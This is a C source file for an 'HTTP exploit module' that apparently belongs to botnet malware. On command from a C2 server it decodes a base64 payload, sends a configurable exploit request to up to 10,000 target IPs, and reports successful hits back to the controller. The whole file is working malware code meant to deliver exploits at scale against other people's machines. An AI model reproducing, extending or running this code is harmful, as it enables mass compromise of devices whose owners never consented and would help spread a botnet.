/* ======================================================================
   HTTP EXPLOIT MODULE
   Targeted HTTP request delivery tool. C2 sends target list + fully
   configurable HTTP request (method, path, headers, UA, body).
   Bot fires request at each target and reports responses via pipe.

   Payload format (base64-encoded blob from C2):
     METHOD:POST
     PATH:/cgi-bin/exploit.cgi
     HEADER:Content-Type: application/x-www-form-urlencoded
     HEADER:X-Custom: value
     UA:Mozilla/5.0 (compatible)
     PORT:80
     EXPECT:200
     ---
     192.168.1.1
     10.0.0.50
     ===
     body_payload_here
   ====================================================================== */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>

#include "headers/bot.h"
#include "headers/scan_report.h"

#ifndef NO_SELFREP

#define HTTP_MAX_TARGETS   10000
#define HTTP_MAX_HEADERS   32
#define HTTP_CONNECT_TIMEOUT 5
#define HTTP_RECV_TIMEOUT    10

int http_exploit_pid  = 0;
int http_report_fd    = -1;
static int http_write_fd = -1;

static void http_report(const char *msg) {
    size_t len = strlen(msg);
    size_t off = 0;
    while (off < len) {
        ssize_t n = write(http_write_fd, msg + off, len - off);
        if (n <= 0) break;
        off += (size_t)n;
    }
}

static void http_child_main(const char *b64_payload) {
    dbuf raw;
    char *data;
    char *targets[HTTP_MAX_TARGETS];
    int ntargets = 0;

    /* Config fields */
    char method[16]   = "GET";
    char path[512]    = "/";
    char ua[256]      = "Mozilla/5.0";
    char expect[64]   = "200";
    int port          = 80;
    char *headers[HTTP_MAX_HEADERS];
    int nheaders      = 0;
    char *body        = NULL;
    int body_len      = 0;

    char *line, *sep;
    int section = 0; /* 0=config, 1=targets, 2=body */
    int ti;

    /* Decode base64 payload */
    debug_log("[http] child: decoding payload (%zu bytes b64)", strlen(b64_payload));
    raw = base64_decode(b64_payload);
    if (raw.data == NULL || raw.len < 4) {
        debug_log("[http] child: invalid payload (data=%p len=%zu)", (void*)raw.data, raw.len);
        http_report("[http] error: invalid payload\n");
        return;
    }
    debug_log("[http] child: decoded %zu bytes", raw.len);

    data = (char *)raw.data;
    data[raw.len] = '\0';

    /* Parse payload sections */
    line = data;
    while (line && *line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';

        /* Check for section separators */
        if (strcmp(line, "---") == 0) {
            section = 1;
            if (nl) line = nl + 1;
            else break;
            continue;
        }
        if (strcmp(line, "===") == 0) {
            section = 2;
            if (nl) {
                body = nl + 1;
                body_len = (int)(raw.len - (size_t)(body - data));
            }
            break; /* rest is body */
        }

        if (section == 0) {
            /* Config lines */
            if (strncmp(line, "METHOD:", 7) == 0) {
                strncpy(method, line + 7, sizeof(method) - 1);
                method[sizeof(method) - 1] = '\0';
            } else if (strncmp(line, "PATH:", 5) == 0) {
                strncpy(path, line + 5, sizeof(path) - 1);
                path[sizeof(path) - 1] = '\0';
            } else if (strncmp(line, "UA:", 3) == 0) {
                strncpy(ua, line + 3, sizeof(ua) - 1);
                ua[sizeof(ua) - 1] = '\0';
            } else if (strncmp(line, "PORT:", 5) == 0) {
                port = atoi(line + 5);
                if (port <= 0 || port > 65535) port = 80;
            } else if (strncmp(line, "EXPECT:", 7) == 0) {
                strncpy(expect, line + 7, sizeof(expect) - 1);
                expect[sizeof(expect) - 1] = '\0';
            } else if (strncmp(line, "HEADER:", 7) == 0) {
                if (nheaders < HTTP_MAX_HEADERS) {
                    headers[nheaders++] = line + 7;
                }
            }
        } else if (section == 1) {
            /* Target IPs */
            char *t = line;
            while (*t == ' ' || *t == '\t') t++;
            if (*t && ntargets < HTTP_MAX_TARGETS) {
                targets[ntargets++] = t;
            }
        }

        if (nl) line = nl + 1;
        else break;
    }

    debug_log("[http] child: parsed config — method=%s path=%s port=%d ua=%.30s expect=%s headers=%d",
              method, path, port, ua, expect, nheaders);
    debug_log("[http] child: %d targets, body=%d bytes", ntargets, body_len);

    if (ntargets == 0) {
        debug_log("[http] child: no targets, aborting");
        http_report("[http] error: no targets\n");
        db_free(&raw);
        return;
    }

    /* Binary report protocol — buffer hits, aggregate miss/fail */
    sr_init(http_write_fd);
    int stat_misses = 0, stat_fails = 0;

    debug_log("[http] child: starting %d targets, %s %s port %d", ntargets, method, path, port);

    /* Iterate targets */
    for (ti = 0; ti < ntargets; ti++) {
        const char *raw_target = targets[ti];
        char ip_buf[64];
        int target_port = port; /* default to config port */
        const char *ip;

        /* Parse IP:PORT if colon present (e.g. "93.123.84.21:8000") */
        {
            const char *colon = strchr(raw_target, ':');
            if (colon && colon > raw_target) {
                size_t ip_len = (size_t)(colon - raw_target);
                if (ip_len >= sizeof(ip_buf)) ip_len = sizeof(ip_buf) - 1;
                memcpy(ip_buf, raw_target, ip_len);
                ip_buf[ip_len] = '\0';
                target_port = atoi(colon + 1);
                if (target_port <= 0 || target_port > 65535) target_port = port;
                ip = ip_buf;
            } else {
                ip = raw_target;
            }
        }

        debug_log("[http] child: [%d/%d] target %s:%d", ti + 1, ntargets, ip, target_port);
        struct sockaddr_in addr;
        struct timeval tv;
        int fd, n;
        char req[4096];
        char resp[4096];
        int req_len, hi;

        fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;

        tv.tv_sec = HTTP_CONNECT_TIMEOUT; tv.tv_usec = 0;
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        tv.tv_sec = HTTP_RECV_TIMEOUT;
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons((uint16_t)target_port);
        if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
            debug_log("[http] child: %s invalid IP, skipping", ip);
            close(fd);
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            debug_log("[http] child: %s connect failed: %s", ip, strerror(errno));
            close(fd);
            stat_fails++;
            continue;
        }
        debug_log("[http] child: %s connected, sending %s %s", ip, method, path);

        /* Build HTTP request (include port in Host header if non-standard) */
        if (target_port == 80 || target_port == 443) {
            req_len = snprintf(req, sizeof(req),
                "%s %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n",
                method, path, ip, ua);
        } else {
            req_len = snprintf(req, sizeof(req),
                "%s %s HTTP/1.1\r\n"
                "Host: %s:%d\r\n"
                "User-Agent: %s\r\n",
                method, path, ip, target_port, ua);
        }

        /* Custom headers */
        for (hi = 0; hi < nheaders && req_len < (int)sizeof(req) - 256; hi++) {
            req_len += snprintf(req + req_len, sizeof(req) - (size_t)req_len,
                "%s\r\n", headers[hi]);
        }

        /* Content-Length if body present */
        if (body && body_len > 0 &&
            (strcmp(method, "POST") == 0 || strcmp(method, "PUT") == 0)) {
            req_len += snprintf(req + req_len, sizeof(req) - (size_t)req_len,
                "Content-Length: %d\r\n", body_len);
        }

        req_len += snprintf(req + req_len, sizeof(req) - (size_t)req_len,
            "Connection: close\r\n\r\n");

        /* Append body */
        if (body && body_len > 0 &&
            req_len + body_len < (int)sizeof(req)) {
            memcpy(req + req_len, body, (size_t)body_len);
            req_len += body_len;
        }

        /* Send */
        debug_log("[http] child: %s sending %d bytes", ip, req_len);
        if (send(fd, req, (size_t)req_len, MSG_NOSIGNAL) <= 0) {
            debug_log("[http] child: %s send failed: %s", ip, strerror(errno));
            close(fd);
            stat_fails++;
            continue;
        }

        /* Receive response */
        n = (int)recv(fd, resp, sizeof(resp) - 1, 0);
        debug_log("[http] child: %s recv %d bytes", ip, n);
        close(fd);

        if (n <= 0) {
            stat_fails++;
            continue;
        }
        resp[n] = '\0';

        /* Extract status code from first line: "HTTP/1.1 200 OK" */
        {
            char status_code[8] = "???";
            char *sp = strchr(resp, ' ');
            if (sp && sp[1]) {
                int si;
                sp++;
                for (si = 0; si < 3 && sp[si] >= '0' && sp[si] <= '9'; si++)
                    status_code[si] = sp[si];
                status_code[si] = '\0';
            }

            /* Check EXPECT match */
            if (strstr(resp, expect) != NULL) {
                debug_log("[http] child: %s HIT (status=%s, matched '%s')", ip, status_code, expect);
                sr_http_hit(addr.sin_addr.s_addr, (uint16_t)atoi(status_code));
            } else {
                debug_log("[http] child: %s MISS (status=%s, no match for '%s')", ip, status_code, expect);
                stat_misses++;
            }
        }
    }

    debug_log("[http] child: scan complete — %d targets (miss=%d fail=%d)", ntargets, stat_misses, stat_fails);
    sr_http_done((uint32_t)ntargets, (uint32_t)stat_misses, (uint32_t)stat_fails);
    sr_flush();
    db_free(&raw);
}

void http_exploit_init(const char *b64_payload) {
    int pipefd[2];
    pid_t pid;

    debug_log("[http] init: starting (current pid=%d)", http_exploit_pid);
    if (http_exploit_pid > 0) {
        debug_log("[http] init: already running (pid=%d)", http_exploit_pid);
        return;
    }
    if (pipe(pipefd) < 0) {
        debug_log("[http] init: pipe() failed: %s", strerror(errno));
        return;
    }

    pid = fork();
    if (pid < 0) {
        close(pipefd[0]);
        close(pipefd[1]);
        return;
    }
    if (pid > 0) {
        /* parent — keep read end */
        close(pipefd[1]);
        http_exploit_pid = pid;
        http_report_fd = pipefd[0];
        fcntl(http_report_fd, F_SETFL,
              fcntl(http_report_fd, F_GETFL) | O_NONBLOCK);
        debug_log("[http] init: forked child pid=%d, report_fd=%d", pid, http_report_fd);
        return;
    }

    /* child — keep write end */
    close(pipefd[0]);
    if (g_ctrl_fd >= 0) { close(g_ctrl_fd); g_ctrl_fd = -1; }
    http_write_fd = pipefd[1];
    debug_log("[http] child: starting (write_fd=%d)", http_write_fd);
    http_child_main(b64_payload);
    debug_log("[http] child: finished, exiting");
    _exit(0);
}

void http_exploit_kill(void) {
    debug_log("[http] kill: pid=%d fd=%d", http_exploit_pid, http_report_fd);
    if (http_exploit_pid > 0) {
        kill(http_exploit_pid, 9);
        http_exploit_pid = 0;
    }
    if (http_report_fd >= 0) {
        close(http_report_fd);
        http_report_fd = -1;
    }
}

#endif /* NO_SELFREP */
